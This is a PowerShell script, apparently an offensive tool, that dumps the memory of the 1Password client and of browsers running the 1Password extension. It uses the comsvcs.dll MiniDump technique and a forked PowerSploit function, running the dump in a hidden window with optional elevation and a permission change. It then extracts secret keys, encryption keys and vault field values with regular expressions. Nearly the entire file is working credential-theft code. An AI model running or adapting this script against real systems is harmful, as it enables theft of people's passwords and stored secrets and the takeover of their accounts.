<#
.SYNOPSIS
    Exfiltrates 1Password secrets by performing a memory dump
.DESCRIPTION
    The 1Password password manager client keeps a lot of sensitive information in memory, such as credentials or any other type of document saved within the database.
.NOTES
    Author:  Tiziano Marra (https://github.com/MrTiz)
    Date:    2023-06-09
    Version: 2.1
#>

#########################################################

function ReRunAsAdministrator() {
    $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo 'PowerShell';
    $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
    $ElevatedProcess.Verb = 'runas'

    [System.Diagnostics.Process]::Start($ElevatedProcess)
    Exit
}

#########################################################

function CheckIfRunAsAdministrator() {
    $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())

    if (-Not $CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        return $False
    	#ReRunAsAdministrator
    }
    else {
        return $True
    }
}

#########################################################

# Forked from https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
# DEPRECATED: THIS FUNCTION, ON WINDOWS 11, REQUIRES 'NT AUTHORITY\SYSTEM' PRIVILEGES
function Out-Minidump {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)][System.Diagnostics.Process]$Process,
        [Parameter(Mandatory = $True)][ValidateScript({ Test-Path $_ })][String]$DumpFilePath
    )

    BEGIN {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle

        $FileStream = New-Object IO.FileStream($DumpFilePath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-Not $Result) {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            Remove-Item -Path $DumpFilePath -Force -ErrorAction SilentlyContinue
            throw $ExceptionMessage
        }
    }

    END {}
}

#########################################################

function dumpProcessMemory {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)][int]$ProcessId,
        [Parameter(Mandatory = $True)][String]$DumpFileName,
        [Parameter(Mandatory = $True)][String]$WorkingDirectory
    )

    $runDll = 'C:\Windows\System32\rundll32.exe'
    $params = "C:\Windows\System32\comsvcs.dll MiniDump $ProcessId $DumpFileName full"

    Start-Process -FilePath $runDll -WorkingDirectory $WorkingDirectory -ArgumentList $params -Wait -WindowStyle Hidden
}

#########################################################

function checkExtensionInstalled {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)][String]$ProcessName
    )

    $BraveExtID   = 'aeblfdkhhhdcdjpifhhbdiojplfjncoa'
    $ChromeExtID  = 'aeblfdkhhhdcdjpifhhbdiojplfjncoa'
    $MSedgeExtID  = 'dppgmdbiimibapkepcbdbmkaabgiofem'
    $firefoxExtID = 'd634138d-c276-4fc8-924b-40a0ea21d284'

    switch -Exact ($ProcessName) {
        'brave' {
            $Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Extensions\$BraveExtID"
            return Test-Path -Path $Path -PathType Container
        }
        'chrome' {
            $Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\$ChromeExtID"
            return Test-Path -Path $Path -PathType Container
        }
        'msedge' {
            $Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\$MSedgeExtID"
            return Test-Path -Path $Path -PathType Container
        }
        'firefox' {
            $Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*\extensions\{$firefoxExtID}.xpi"
            return Test-Path -Path $Path -PathType Leaf
        }
        Default {
            return $False
        }
    }
}

#########################################################

function fixPermissions {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)][ValidateScript({ Test-Path $_ })][String]$DumpFilePath
    )

    $icaclsPath = 'C:\Windows\System32\icacls.exe'
    Start-Process -FilePath $icaclsPath -ArgumentList "`"$DumpFilePath`" /grant `"$env:USERNAME`":F" -Wait -WindowStyle Hidden
}

#########################################################

$IsAdmin = CheckIfRunAsAdministrator

if (-not $IsAdmin) {
    Write-Warning "$($MyInvocation.MyCommand.Name) is running with non-administrative privileges! The outputs may be uninteresting or inaccurate.`n"
}

$Folder   = $env:TEMP
$FileName = 'tmp1P.dmp'
$FullPath = "$Folder\$FileName"

Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue

###################

$Patterns = @(
    '\{"account_state":"\w","account_template_version":\d+,"account_type":"\w","account_version":\d+,"base_attachment_url":".+?","base_avatar_url":".+?","secret_key":".+?\}\}',
    '\{"type":"Success","content":\{"callbackId":\d+,"response":\{"type":"NmRequestAccounts","content":\{"accounts":\[\{"type":"Unlocked","content":\{"details":\{"accountUuid":".+?\}\}\}\}',
    '\{"title":".+?"key_ops":\["encrypt","decrypt"\]\}\}\}\}',
    '\{"ps":[ -~]+?\}\0',
    '\{"sections":\[\{"[ -~]+\}',
    '\{"fields":\[\{"value":"[ -~]+\}\]\}'
)

$Pattern = "($($Patterns -Join '|'))"

$ProcessesClient = @('1Password', '1Password-BrowserSupport')
$ProcessesBrwExt = @('brave', 'firefox', 'msedge', 'chrome')

$Processes = @()

foreach ($Client in $ProcessesClient) {
    $Processes += Get-Process -Name $Client -ErrorAction SilentlyContinue
}

foreach ($Browser in $ProcessesBrwExt) {
    if (checkExtensionInstalled -ProcessName $Browser) {
        $Processes += Get-Process -Name $Browser -ErrorAction SilentlyContinue
    }
}

$i = 0

foreach ($Process in $Processes) {
    $PercentCompleted = [Math]::Round(($i / $Processes.Count) * 100)
    Write-Progress -Activity "Dumping '$($Process.ProcessName) ($($Process.Id))'" -Status "$i of $($Processes.Count) completed - $PercentCompleted%" -PercentComplete $PercentCompleted -SecondsRemaining -1

    dumpProcessMemory -ProcessId $Process.Id -DumpFileName $FileName -WorkingDirectory $Folder

    if (-not (Test-Path -Path $FullPath -PathType Leaf)) {
        $i++
        continue
    }

    if (-not $IsAdmin) {
        fixPermissions -DumpFilePath $FullPath
    }

    Select-String -Path $FullPath -Pattern $Pattern -AllMatches | 
        ForEach-Object { 
            $_.Matches
        } | 
        ForEach-Object {
            $Color = "White"

            switch -Wildcard ($_.Value) {
                '{"fields":*' {
                    $Color = "Green"
                    break
                }
                '{"type":*' {
                    $Color = "Green"
                    break
                }
                '{"sections":*' {
                    $Color = "Green"
                    break
                }
                '{"account_state":*' {
                    $Color = "Red"
                    break
                }
                '{"title":*' {
                    $Color = "Red"
                    break
                }
                '{"ps":*' {
                    $Color = "Red"
                    break
                }
                default {
                    $Color = "Yellow"
                    break
                }
            }
            
            Write-Host "$($_.Value)`n" -ForegroundColor $Color
        }

    Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue
    $i++
}
